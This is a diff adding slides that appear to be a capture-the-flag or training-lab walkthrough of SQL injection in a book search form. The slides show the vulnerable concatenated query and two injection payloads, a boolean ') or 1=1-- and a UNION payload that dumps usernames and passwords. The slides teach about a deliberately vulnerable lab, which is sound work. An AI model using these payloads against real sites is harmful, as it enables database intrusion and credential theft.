@@ -1,0 +1,32 @@
+<div class="slides">
+    {% if cdesc %}
+    <section class="desc-slide">
+        <h2>Goal:</h2>
+        <p>{{ cdesc }}</p>
+    </section>
+    {% endif %}
+    <section>
+<p>
+    The web page performs a GET request with the <code>title</code> parameter when searching for a book. The query it performs can be seen here:
+</p>
+<pre><code data-trim data-noescape>
+SELECT * from books WHERE id = (SELECT id FROM books WHERE title like '" + title + "%')
+</code></pre>
+    </section>
+    <section>
+<p>
+All we need to do to abuse this is closing the <code>LIKE</code> operand. For example, we can dump all the books in the database by injecting the following command:
+</p>
+<pre><code data-trim data-noescape>
+') or 1=1--
+</code></pre>
+    </section>
+    <section>
+<p>
+If we combine this with what was learned previously about UNION-based SQL injection, the flag should be easily found. For example, all usernames and passwords, including the flag, can be dumped by injecting the following command:
+</p>
+<pre><code data-trim data-noescape>
+') union select 1,2,group_concat(username),group_concat(password) from users--
+</code></pre>
+    </section>
+</div>
